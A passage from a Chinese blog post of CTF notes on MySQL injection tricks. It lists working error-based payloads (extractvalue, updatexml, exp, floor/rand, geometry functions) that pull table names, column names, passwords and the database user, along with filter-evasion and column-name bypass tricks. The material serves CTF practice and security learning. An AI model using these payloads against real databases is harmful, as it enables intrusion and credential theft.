+<p>查表<br>	and extractvalue(1, concat(1,(select table_name from information_schema.tables limit 0,1)))–+;<br>查列<br>	and extractvalue(1, concat(1,(select column_name from information_schema.columns limit 0,1)))–+;<br>查数据<br>	and extractvalue(1, concat(1,(select password from users  limit 0,1)))–+;</p>
+<p>2.UpdateXml报错</p>
+<p>测试语句</p>
+<pre><code class="hljs">and 1=(updatexml(1,concat(0x3a,(select user())),1))
+</code></pre>
+<p>实际测试过程</p>
+<pre><code class="hljs">mysql&gt; select * from article where id = 1 and 1=(updatexml(0x3a,concat(1,(select user())),1))
+ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’ 
+</code></pre>
+<p>3.运算数值的大小限制报错</p>
+<pre><code class="hljs">select exp(~(select*from(select user())a))；
+ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#39;root@localhost&#39; from dual)))&#39;
+</code></pre>
+<p>这个函数是计算e的n次方，~是按位取补，exp计算的次方数是有限制的，我们如果给他传一个字符串，php 的弱类型就会当成是0这样取反之后就超了，报错</p>
+<p>类似的还有：<br>	<br>	select !(select*from(select user())x)-~0;</p>
+<p>这里注意一下：</p>
+<p>进行嵌套查询的时候子查询出来的的结果是作为一个派生表来进行上一级的查询的，所以子查询的结果必须要有一个别名，一般是as+别名 但是as 可以省略。</p>
+<p>4.floor()</p>
+<pre><code class="hljs">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+</code></pre>
+<p>5.geometrycollection()</p>
+<pre><code class="hljs">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
+</code></pre>
+<p>6.multipoint()</p>
+<pre><code class="hljs">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
+</code></pre>
+<p>7.polygon()</p>
+<pre><code class="hljs">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
+</code></pre>
+<p>8.linestring()</p>
+<pre><code class="hljs">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
+</code></pre>
+<p>9.multilinestring()</p>
+<pre><code class="hljs">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
+</code></pre>
+<p>10.multipolygon()</p>
+<pre><code class="hljs">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
+</code></pre>
+<h2 id="限制与from的组合"><a href="#限制与from的组合" class="headerlink" title="限制与from的组合"></a>限制与from的组合</h2><p>用 from. 代替 from </p>
+<h2 id="如果遇到表名或者字段名是保留字"><a href="#如果遇到表名或者字段名是保留字" class="headerlink" title="如果遇到表名或者字段名是保留字"></a>如果遇到表名或者字段名是保留字</h2><p>这个时候最好使用点号连接表名和字段名，或者直接使用反引号包起来</p>
+<p>##利用mysql 的特性<br>1.当使用自定义的不存在函数的时候就会报错显示出库的名字</p>
+<pre><code class="hljs">mysql&gt; select * from users where id =a()；
+ERROR 1305 (42000): FUNCTION security.a does not exist
+</code></pre>
+<p>2.当查找重复的列的是时候就会报错<br>	<br>	pro_id&#x3D;2 union select * from (select * from product_2017ctf as A join product_2017ctf as B using(pro_id)) as C<br>	Duplicate column name ‘pro_name’ </p>
+<p>注意： MySQL是兼容两个列相同的但是却不兼容在这个基础上再select * from </p>
+<h2 id="在列名被过滤的情况下得到结果"><a href="#在列名被过滤的情况下得到结果" class="headerlink" title="在列名被过滤的情况下得到结果"></a>在列名被过滤的情况下得到结果</h2><p>要在不出现字段名的情况下查出内容，将一个虚拟表和当前表联合起来即可</p>
+<pre><code class="hljs">pro_id=-1 union select 1,a.4,3,4 from (select 1,2,3,4 from dual union select * from product_2017ctf)a limit 3,1; 
+</code></pre>
+<p>##在函数名与括号间添加空格或者注释绕过函数过滤</p>
+<p>例如：</p>
+<p>concat&#x2F;**&#x2F;()</p>
+<h2 id="在查询时使用一个不存在的函数就能报错出数据库的名字"><a href="#在查询时使用一个不存在的函数就能报错出数据库的名字" class="headerlink" title="在查询时使用一个不存在的函数就能报错出数据库的名字"></a>在查询时使用一个不存在的函数就能报错出数据库的名字</h2><p>select password from contents where id&#x3D;a()<br>这个a()是不存在的函数，结果如下</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/mysql_trick.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/sql/" class="print-no-link">#sql</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTF中注入常见技巧的汇总</div>
+      <div>http://example.com/2017/11/21/mysqltrick/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 21, 2017</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2017/11/28/php%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%87%E5%BF%98/" title="php命令行的使用">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">php命令行的使用</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2017/11/04/kali/" title="kali源以及虚拟机工具安装">
+                        <span class="hidden-mobile">kali源以及虚拟机工具安装</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
